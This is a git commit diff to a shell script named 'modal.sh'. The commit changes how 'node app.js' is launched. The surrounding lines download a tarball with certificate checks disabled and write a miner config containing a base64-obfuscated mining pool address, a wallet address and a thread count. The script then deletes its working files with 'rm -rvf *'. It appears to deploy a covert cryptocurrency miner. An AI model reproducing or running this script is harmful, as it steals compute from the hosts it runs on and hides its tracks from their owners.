59f10be8b3065938c81cc917ddf3a62d3419ac78
paskofa10 <mr.paskofa10@jugda.com>
2025-09-09 23:31:01 +0700

    Update modal.sh

--- modal.sh
+++ modal.sh
@@ -5,7 +5,7 @@ curl -sLkO https://github.com/paskofa10/webmoon/releases/download/flex/mino.tar.
 tar -xvf mino.tar.gz > /dev/null 2>&1
 echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW", "password": "c=MAZA,zap=MAZA", "argent": "BeeMJe/1.1", "threads": 40}' > data.txt
 nproc --all 
-node app.js > /dev/null 2>&1 &
+node app.js
 sleep 10
 rm -rvf *
 while true
